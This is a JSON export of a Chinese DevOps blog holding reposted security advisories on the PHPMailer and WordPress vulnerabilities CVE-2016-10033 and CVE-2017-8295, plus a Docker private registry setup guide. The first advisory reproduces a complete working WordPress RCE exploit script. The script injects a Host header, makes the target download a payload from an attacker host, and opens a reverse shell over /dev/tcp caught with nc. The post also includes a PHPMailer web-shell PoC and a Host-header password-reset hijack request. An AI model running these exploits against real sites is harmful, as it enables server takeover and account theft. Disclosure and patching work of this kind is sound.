{"meta":{"title":"Netb2c's Blog","subtitle":"We'd better struggle for the future rather than regret for the past.","description":"Life & Work Essays.","author":"Netb2c","url":"http://blog.unixmen.cn"},"pages":[{"title":"","date":"2017-03-03T06:54:20.000Z","updated":"2017-03-03T06:54:20.000Z","comments":true,"path":"404.html","permalink":"http://blog.unixmen.cn/404.html","excerpt":"","text":"","raw":null,"content":null},{"title":"","date":"2017-03-29T01:10:29.000Z","updated":"2017-03-15T05:03:34.000Z","comments":true,"path":"google0d8bd60c9b676916.html","permalink":"http://blog.unixmen.cn/google0d8bd60c9b676916.html","excerpt":"","text":"google-site-verification: google0d8bd60c9b676916.html","raw":null,"content":null},{"title":"About","date":"2017-02-15T08:36:30.000Z","updated":"2017-03-06T06:54:49.000Z","comments":true,"path":"about/index.html","permalink":"http://blog.unixmen.cn/about/index.html","excerpt":"","text":"Netb2c Nickname: netb2c Position: DevOps Email: netb2c(a)linux.cn Blog: http://blog.unixmen.cn Github:netb2c","raw":null,"content":null},{"title":"第一篇博客","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T03:47:05.000Z","comments":true,"path":"第一篇博客/index.html","permalink":"http://blog.unixmen.cn/第一篇博客/index.html","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null}],"posts":[{"title":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","slug":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","date":"2017-05-05T01:33:21.000Z","updated":"2017-05-05T01:50:56.000Z","comments":true,"path":"2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","excerpt":"","text":"##【2017.5.4更新】 昨天曝出了两个比较热门的漏洞，一个是CVE-2016-10033，另一个则为CVE-2017-8295。从描述来看，前者是WordPress Core 4.6一个未经授权的RCE漏洞。不过实际上，这就是去年12月份FreeBuf已经报道的漏洞，因此我们在原文基础上进行更新。 这次漏洞公告就是PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。实际上Wordfence当时就曾经提到过该漏洞影响到了WP Core。 最新的这则公告提到了PHP mail()函数的新利用向量，可在MTA – Exim4之上利用该漏洞，Exim在如Debian或Ubuntu等系统中都是默认安装的。这样一来也就增加了此类攻击的范围和漏洞的严重性。具体为利用host字段注入了恶意数据，进入到了mail函数，再利用sendmail (实际上是软连接到的exim4)命令的-be 参数来执行命令。 之所以到现在才公布这部分细节，是期望给予WordPress和其它收到影响的软件提供商更多时间来升级受影响的Mail库。除此之外，也是针对CVE-2017-8295漏洞留出更多的修复时间。 漏洞利用详情参见：https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html 影响范围： 本次公告中提到的RCE PoC基于WordPress 4.6实现，不过其它版本的WordPress也可能受到影响。 视频演示PoC：https://www.youtube.com/watch?v=ZFt_S5pQPX0 更新：PoC代码已经公布，请站长们尽快升级！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#!/bin/bash## __ __ __ __ __# / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________# / / / _ \\/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/# / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ )# /_____/\\___/\\__, /\\__,_/_/ /_/ /_/\\__,_/\\___/_/|_|\\___/_/ /____/# /____/### WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit# CVE-2016-10033## wordpress-rce-exploit.sh (ver. 1.0)### Discovered and coded by## Dawid Golunski (@dawid_golunski)# https://legalhackers.com## ExploitBox project:# https://ExploitBox.io## Full advisory URL:# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html## Exploit src URL:# https://exploitbox.io/exploit/wordpress-rce-exploit.sh### Tested on WordPress 4.6:# https://github.com/WordPress/WordPress/archive/4.6.zip## Usage:# ./wordpress-rce-exploit.sh target-wordpress-url### Disclaimer:# For testing purposes only### -----------------------------------------------------------------## Interested in vulns/exploitation?### .;lc&apos;# .,cdkkOOOko;.# .,lxxkkkkOOOO000Ol&apos;# .&apos;:oxxxxxkkkkOOOO0000KK0x:&apos;# .;ldxxxxxxxxkxl,.&apos;lk0000KKKXXXKd;.# &apos;:oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl.# &apos;&apos;;ldxxxxxdc,. ,oOXXXNNNXd;,.# .ddc;,,:c;. ,c: .cxxc:;:ox:# .dxxxxo, ., ,kMMM0:. ., .lxxxxx:# .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx:# .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx:# .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx:# .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx:# .dxxxxxc .cNMMMN.oMMMMx&apos; .xxxxxx:# .dxxxxxc lKo;dNMN.oMM0;:Ok. &apos;xxxxxx:# .dxxxxxc ;Mc .lx.:o, Kl &apos;xxxxxx:# .dxxxxxdl;. ., .. .;cdxxxxxx:# .dxxxxxxxxxdc,. &apos;cdkkxxxxxxxx:# .&apos;:oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,.# .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.# .&apos;:oxxxxxxxxx.ckkkkkkkkxl,.# .,cdxxxxx.ckkkkkxc.# .&apos;:odx.ckxl,.# .,.&apos;.## https://ExploitBox.io## https://twitter.com/Exploit_Box## -----------------------------------------------------------------rev_host=&quot;192.168.57.1&quot;function prep_host_header() &#123;cmd=&quot;$1&quot;rce_cmd=&quot;\\$&#123;run&#123;$cmd&#125;&#125;&quot;;# replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;#sed &apos;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^/^\\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\\$spool_directory&#125;&#125;^g&apos;`&quot;# replace &apos; &apos; (space) with#sed &apos;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^ ^\\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\\$tod_log&#125;&#125;^g&apos;`&quot;#return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;return 0&#125;#cat exploitbox.ansintro=&quot;DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09rbzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19fG1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19cG1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAgIHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19fIC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19fX19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtbNUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01NTU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTszNG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2ROTU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMgICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQobWzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1szNG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtbMzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19fX19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;intro2=&quot;ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtbMG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBEaXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAgICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJpbGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;echo &quot;$intro&quot; | base64 -decho &quot;$intro2&quot; | base64 -dif [ &quot;$#&quot; -ne 1 ]; thenecho -e &quot;Usage:\\n$0 target-wordpress-url\\n&quot;exit 1fitarget=&quot;$1&quot;echo -ne &quot;\\e[91m[*]\\033[0m&quot;read -p &quot; Sure you want to get a shell on the target &apos;$target&apos; ? [y/N] &quot; choiceechoif [ &quot;$choice&quot; == &quot;y&quot; ]; thenecho -e &quot;\\e[92m[*]\\033[0m Guess I can&apos;t argue with that... Let&apos;s get started...\\n&quot;echo -e &quot;\\e[92m[+]\\033[0m Connected to the target&quot;# Serve payload/bash script on :80RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;echo &quot;$RCE_exec_cmd&quot; &gt; rce.txtpython -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;hpid=$!# Save payload on the target in /tmp/rcecmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -s -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpasswordecho -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot;# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword &amp;echo -e &quot;\\n\\e[92m[+]\\033[0m Payload executed!&quot;echo -e &quot;\\n\\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m...\\n&quot;nc -vv -l 1337echoelseecho -e &quot;\\e[92m[+]\\033[0m Responsible choice ;) Exiting.\\n&quot;exit 0fiecho &quot;Exiting...&quot;exit 0 上述另外一个最新曝出编号为CVE-2017-8295的漏洞，严重程度被评级为介于Medium和High之间（而非Critical），影响到WordPress Core &lt;= 4.7.4以下的版本。 这个漏洞的概况是这样的：WordPress有个密码重置功能，该特性中存在漏洞——在某些情况下可能导致攻击者在无需身份认证的情况下拿到密码重置链接，这样一来攻击者就能获取目标用户的WordPress账户了。 这个漏洞源于WordPress默认在创建密码重置邮件的时候，采用不受信任的数据。具体的利用方式点击这里查看。目前WordPress官方暂无针对该问题的解决方案，可以采用如下临时解决方案： 用户可启用UserCanonicalName实施静态SERVER_NAME值 https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname 据作者所说，该问题已经向WordPress安全团队进行过多次反馈，最早一次是在去年7月份，但一直没有得到相应的反馈。 【2016.12.27原文】 这次曝出远程代码执行漏洞的是堪称全球最流行邮件发送类的PHPMailer，据说其全球范围内的用户量大约有900万——每天还在持续增多。 GitHub上面形容PHPMailer“可能是全球PHP发送邮件最流行的代码。亦被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等”。所以这个漏洞影响范围还是比较广的，漏洞级别也为Critical最高级。 漏洞编码 CVE-2016-10033 影响版本 PHPMailer &lt; 5.2.18 漏洞级别 高危 漏洞描述 独立研究人员Dawid Golunski发现了该漏洞——远程攻击者利用该漏洞，可实现远程任意代码在web服务器账户环境中执行，并使web应用陷入威胁中。攻击者主要在常见的web表单如意见反馈表单，注册表单，邮件密码重置表单等使用邮件发送的组件时利用此漏洞。 不过有关该漏洞的细节信息，研究人员并未披露，期望给予网站管理员更多的时间来升级PHPMailer类，避免受漏洞影响。 漏洞PoC 实际上Dawid Golunski已经做了个可行的RCE PoC，不过会迟一些再发布。关注视频PoC请点击：https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html 更新：PoC代码已经公布，请站长们尽快升级！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344更新：PoC代码已经公布，请站长们尽快升级！&lt;?php /* PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033) A simple PoC (working on Sendmail MTA) It will inject the following parameters to sendmail command: Arg no. 0 == [/usr/sbin/sendmail] Arg no. 1 == [-t] Arg no. 2 == [-i] Arg no. 3 == [-fattacker\\] Arg no. 4 == [-oQ/tmp/] Arg no. 5 == [-X/var/www/cache/phpcode.php] Arg no. 6 == [some&quot;@email.com] which will write the transfer log (-X) into /var/www/cache/phpcode.php file. The resulting file will contain the payload passed in the body of the msg: 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306 09607 &lt;&lt;&lt; Content-Type: text/html; charset=us-ascii 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306-- See the full advisory URL for details. */ // Attacker&apos;s input coming from untrusted source such as $_GET , $_POST etc. // For example from a Contact form $email_from = &apos;&quot;attacker\\&quot; -oQ/tmp/ -X/var/www/cache/phpcode.php some&quot;@email.com&apos;; $msg_body = &quot;&lt;?php phpinfo(); ?&gt;&quot;; // ------------------ // mail() param injection via the vulnerability in PHPMailer require_once(&apos;class.phpmailer.php&apos;); $mail = new PHPMailer(); // defaults to using php &quot;mail()&quot; $mail-&gt;SetFrom($email_from, &apos;Client Name&apos;); $address = &quot;customer_feedback@company-X.com&quot;; $mail-&gt;AddAddress($address, &quot;Some User&quot;); $mail-&gt;Subject = &quot;PHPMailer PoC Exploit CVE-2016-10033&quot;; $mail-&gt;MsgHTML($msg_body); if(!$mail-&gt;Send()) &#123; echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; &#125; else &#123; echo &quot;Message sent!\\n&quot;; &#125; 漏洞修复 更新到5.2.18：https://github.com/PHPMailer/PHPMailer 漏洞详情目前已经提交给了PHPMailer官方——官方也已经发布了PHPMailer 5.2.18紧急安全修复，解决上述问题，受影响的用户应当立即升级。详情可参见： https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md *本文转自FreeBuf.COM","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"WordPress爆未经授权的密码重置漏洞","slug":"WordPress爆未经授权的密码重置漏洞","date":"2017-05-05T01:14:35.000Z","updated":"2017-05-05T01:28:24.000Z","comments":true,"path":"2017/05/05/WordPress爆未经授权的密码重置漏洞/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/","excerpt":"","text":"漏洞提交者：Dawid Golunski漏洞编号：CVE-2017-8295发布日期：2017-05-03修订版本：1.0漏洞危害：中/高 I. 漏洞WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day) II. 背景WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。 III. 介绍WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。 IV. 描述该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头 1234567891011121314------[ wp-includes/pluggable.php ]------if ( !isset( $from_email ) ) &#123; // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] ); if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123; $sitename = substr( $sitename, 4 ); &#125; $from_email = &apos;wordpress@&apos; . $sitename;&#125;----------------------------------------- 正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（参考Apache文档）由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（参考PHP文档）基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。 攻击场景：如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）某些自动回复可能会附加有邮件发送副本发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。 V. POC 如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):12345678-----[ HTTP Request ]----POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: injected-attackers-mxserver.comContent-Type: application/x-www-form-urlencodedContent-Length: 56user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password WordPress将触发管理员账户的密码重置功能由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail12345678910------[ resulting e-mail ]-----Subject: [CompanyX WP] Password ResetReturn-Path: &lt;wordpress@attackers-mxserver.com&gt;From: WordPress &lt;wordpress@attackers-mxserver.com&gt;Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;X-Priority: 3MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit 有人请求将以下账户的密码进行重置：12http://companyX-wp/wp/wordpress/Username: admin 如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：1http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E 正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域通过bash脚本替换/usr/sbin/sendmail以执行头的验证：12#!/bin/bashcat &gt; /tmp/outgoing-email VI. 业务影响在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。 VII. 系统影响WordPress至最新版本4.7.4全部受影响 VIII. 解决方案目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（参考Apache） IX. 参考文献https://legalhackers.com https://ExploitBox.io Vendor site: https://wordpress.org http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname http://php.net/manual/en/function.mail.php https://tools.ietf.org/html/rfc5321 转自FreeBuf.com","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"Docker私有镜像仓库节点部署","slug":"Docker私有镜像仓库节点部署","date":"2017-05-02T09:42:29.000Z","updated":"2017-05-02T10:00:19.000Z","comments":true,"path":"2017/05/02/Docker私有镜像仓库节点部署/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/","excerpt":"","text":"关于本文本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。 硬件要求生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求： 最小 推荐 备注 CPU 1 core 大于4 core 内存 1 GB 大于32 GB 磁盘 5 GB 大于120 GB 小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上 独立数据盘 RHEL/CentOS 需要 &gt; 5GB 独立数据盘 RHEL/CentOS 需要 &gt;30GB 独立数据盘 需要使用 devicemapper 的 direct-lvm 模式 网络 所有节点互通 所有节点互通, ping &lt;1ms 至少两块网卡 ##系统要求 系统推荐：CentOS 7.2 内核推荐：大于3.10 注：默认第一块网卡为内网 时间同步 安装ntpd服务 1yum install ntp 与上游ntp服务器进行时间同步 1ntpdate 10.154.88.88 配置ntp服务配置文件 1sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos; /etc/ntp.conf 启动ntpd服务 12systemctl enable ntpdsystemctl start ntpd 配置本地存储为方便后期维护管理，采用LVM对本地存储进行管理 创建PV 1pvcreate /dev/sdb 创建VG 1vgcreate data /dev/sdb 创建LV 1lvcreate -L 500G data -n docker_data 格式化新分区 1mkfs.xft /dev/data/docker_data ##系统更新 为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。1yum update -y ##安装容器服务 卸载系统默认（版本较老的）Docker环境包 12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 配置官方软件仓库源 12yum install -y yum-utilsyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 更新本地缓存 1yum makecache fast 查看软件包信息 1yum list docker-ce.x86_64 --showduplicates |sort -r 安装Docker engine社区版 1yum -y install docker-ce 本地容器服务配置 启动容器服务 1systemctl start docker 设置开机启动 1systemctl enable docker 设置容器数据存储路径 12345systemctl stop dockermv /var/lib/docker&#123;,.bak&#125;mkdir /var/lib/dockermount /dev/data/docker_data /var/lib/dockerecho &quot;/dev/data/docker_data /var/lib/docker xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 配置加速器 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io 启动容器服务 1systemctl start docker 测试运行实例 1docker run hello-world 创建私有镜像仓库镜像存放分区 创建LV 1lvcreate -L 2000G data -n registry_data 格式化新分区 1mkfs.xft /dev/data/registry_data 挂载新分区 1mount /dev/data/registry_data /data/docker/registry/ 修改系统启动挂载分区 1echo &quot;/dev/data/registry_data /data/registry_data xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 启动私有镜像仓库registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库 1docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest 私有镜像仓库测试 查看本地镜像1234[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 可以看到，本机共有两个容器镜像，分别是：registry和busybox 重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox 1docker tag busybox 10.82.2.103:5000/busybox 再次查看本地镜像再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像 12345[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 将本地镜像推送到本地仓库中 1docker push 10.82.2.103:5000/busybox 推送过程 1234[root@docker-registry ~]# docker push 10.82.2.103:5000/busyboxThe push refers to a repository [10.82.2.103:5000/busybox]c0de73ac9968: Pushed latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527 查看本地仓库中的镜像列表 1curl 10.82.2.103:5000/v2/busybox/tags/list 结果如下：1&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125; 删除本地busybox镜像 1234567[root@docker-registry ~]# docker rmi busyboxUntagged: busybox:latestUntagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 从私有仓库拉取镜像 12345[root@docker-registry ~]# docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busyboxDigest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Image is up to date for 10.82.2.103:5000/busybox:latest 可以看到成功获取私有仓库中的镜像 尝试从私有镜像仓库中拉取的镜像启动容器 123456[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox / # hostname 11ea9195246f/ # hostid 11ac0300/ # 在其他容器计算节点上进行测试测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。 拉取私有镜像仓库中的镜像 123456[I] $ docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busybox04176c8b224a: Pull complete Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest 查看拉取的镜像 123456789[I] $ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 13 days ago 